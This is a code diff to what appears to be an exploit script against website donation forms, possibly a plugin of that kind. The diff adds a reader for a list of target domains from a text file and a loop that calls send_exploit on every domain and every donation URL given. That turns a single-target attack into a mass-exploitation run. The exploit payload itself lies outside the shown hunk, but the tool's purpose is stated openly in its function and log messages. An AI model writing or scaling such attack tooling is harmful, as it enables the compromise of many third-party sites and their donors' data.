@@ -110,8 +110,32 @@ def send_exploit(domain, donation_page_url):
         logging.error(f"Error sending exploit: {str(e)}")
         return False
 
+# Function to read domains from a .txt file
+def read_domains_from_file(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            domains = [line.strip() for line in file.readlines()]
+            return domains
+    except Exception as e:
+        logging.error(f"Error reading file: {str(e)}")
+        return []
+
 # Example usage
-domain = input("Please enter the domain (e.g., example.com): ")
-donation_page_url = input("Please enter the full donation form URL (e.g., https://example.com/donations/donation-form): ")
-if not send_exploit(domain, donation_page_url):
-    logging.info("Exploit attempt failed or no vulnerabilities found.")
+file_path = input("Please enter the path to the .txt file containing domains: ")
+
+# Read the domains from the file
+domains = read_domains_from_file(file_path)
+
+# Input a list of donation form URLs
+donation_page_urls = input("Please enter the donation form URLs (comma-separated): ").split(',')
+
+# Remove any leading/trailing whitespace from the URLs
+donation_page_urls = [url.strip() for url in donation_page_urls]
+
+# Iterate over each domain and URL, and try to send exploit
+for domain in domains:
+    logging.info(f"Processing domain: {domain}")
+    for donation_page_url in donation_page_urls:
+        logging.info(f"Processing URL: {donation_page_url}")
+        if not send_exploit(domain, donation_page_url):
+            logging.info(f"Exploit attempt failed or no vulnerabilities found for {domain} with {donation_page_url}.")
